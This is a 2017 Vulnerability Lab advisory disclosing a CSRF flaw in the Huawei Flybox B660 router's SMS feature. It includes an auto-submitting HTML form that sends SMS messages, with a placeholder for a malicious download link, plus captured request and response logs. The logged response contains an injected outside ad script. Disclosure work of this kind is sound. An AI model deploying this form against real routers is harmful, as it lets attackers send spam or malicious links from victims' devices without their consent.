Document Title:
===============
Huawei Flybox B660 - (POST SMS) CSRF Web Vulnerability


References (Source):
====================
https://www.vulnerability-lab.com/get_content.php?id=2026


Release Date:
=============
2017-01-12


Vulnerability Laboratory ID (VL-ID):
====================================
2026


Common Vulnerability Scoring System:
====================================
4.4


Product & Service Introduction:
===============================
The Huawei B660 has a web interface for configuration. You can use any web browser you like to login to the Huawei B660.

(Copy of the Homepage: http://setuprouter.com/router/huawei/b660/manual-1184.pdf )


Abstract Advisory Information:
==============================
The vulnerability laboratory core research team discovered a security flaw that affects the official Huawei Flybox B660 3G/4G router product series.



Vulnerability Disclosure Timeline:
==================================
2017-01-12:	Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
Huawei
Product: Flybox - Router (Web-Application) B660 3G/4G


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
A remote cross-site request forgery vulnerability has been discovered in the official Huawei Flybox B660 3G/4G router product series.
The security vulnerability allows a remote attacker to perform unauthenticated application requests with non-expired browser session 
credentials to unauthorized execute specific backend functions.

The vulnerability is located in the `/htmlcode/html/sms.cgi` and `/htmlcode/html/sms_new.asp` modules and the `RequestFile` parameter 
of the localhost path URL. Remote attackers are able to send sms messages as malicious bomb to other phone numbers from any Huawei 
Flybox B660 via unauthenticated POST method request.

The security risk of the csrf web vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 4.4.
Exploitation of the csrf web vulnerability requires a low privilege web-application user account and medium or high user interaction. 
Successful exploitation of the vulnerability results in unauthenticated application requests and manipulation of affected or connected 
device backend modules.


Request Method(s):
[+] POST

Vulnerable Module(s):
[+] /htmlcode/html/sms.cgi
[+] /htmlcode/html/sms_new.asp

Vulnerable Parameter(s):
[+] RequestFile


Software version of the modem:
1066.12.15.01.200

Hardware version of the modem:
WLB3TCLU

Name of the device:
B660

Hardware version of the router:
WL1B660I001

Software version of the router:
1066.11.15.02.110sp01


Proof of Concept (PoC):
=======================
The security vulnerability can be exploited by remote attackers without privilege web-application user account and with medium or high user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.


PoC: CSRF Exploit
<html>
  <!-- CSRF PoC By SaifAllah benMassaoud -->
  <body>
    <form  id="test" action="http://localhost/htmlcode/html/sms.cgi?RequestFile=/htmlcode/html/sms_new.asp" method="POST">
      <input type="hidden" name="action" value="Send" />
      <input type="hidden" name="action" value="Send" />
      <input type="hidden" name="sms&#95;text&#95;mode" value="1" />
      <input type="hidden" name="sms&#95;content&#95;1" value="[Malicious Site + IP Adress/Redirection + File]:=[download]" />
      <input type="hidden" name="sms&#95;num" value="1" />
      <input type="hidden" name="phone&#95;numbers" value="[Victim PhoneNumber]" />
      <input type="hidden" name="page" value="sms&#95;new&#46;asp" />
    </form>
    <script>document.getElementById('test').submit();</script>
  </body>
</html>


--- PoC Session Logs [POST] ---
/htmlcode/html/sms.cgi?RequestFile=/htmlcode/html/sms_new.asp HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.4.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost/htmlcode/html/sms.cgi?RequestFile=/htmlcode/html/sms.asp
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 2059
action=Send&action=Send&sms_text_mode=1&sms_content_1=Malicious Site + IP Adress/Redirection + File:=download&sms_num=1&station=
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,&phone_numbers=[Victim PhoneNumber]&page=sms_new.asp
HTTP/1.1 200 OK
CACHE-CONTROL: no-cache
Content-Type: text/html
Content-Length: 364

<html><script src="http://cakecdn.info/ad_20160927.js?ver=1&channel=1" id="{6AF30038-1A5F-46F9-AE73-455BB857D493}"></script>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>replace</title>
<body>
<script language="JavaScript" type="text/javascript">
var pageName = '/';
top.location.replace(pageName);
</script>
</body>
</html>


Note: Attackers can as well put an auto-submit java-script generated form inside an high traffic website tp exploit.


Security Risk:
==============
The security risk of the cross site request forgery vulnerability in the Huawei Flybox B660 3G/4G router product series is estimated as medium. (CVSS 4.4)



Credits & Authors:
==================
SaifAllah benMassaoud - ( http://www.vulnerability-lab.com/show.php?user=SaifAllahbenMassaoud )



Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability mainly for 
consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, 
deface websites, hack into databases or trade with stolen data.

Domains:    www.vulnerability-lab.com 		- www.vuln-lab.com 						- www.evolution-sec.com
Section:    magazine.vulnerability-lab.com 	- vulnerability-lab.com/contact.php 				- evolution-sec.com/contact
Social:	    twitter.com/vuln_lab		- facebook.com/VulnerabilityLab 				- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php 	- vulnerability-lab.com/rss/rss_upcoming.php 			- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php 	- vulnerability-lab.com/list-of-bug-bounty-programs.php 	- vulnerability-lab.com/register.php

Any modified copy or reproduction, including partially usages, of this file, resources or information requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark 
of vulnerability-lab team & the specific authors or managers. To record, list, modify, use or edit our material contact (admin@) to get a ask permission.

				    Copyright © 2017 | Vulnerability Laboratory - [Evolution Security GmbH]™



-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com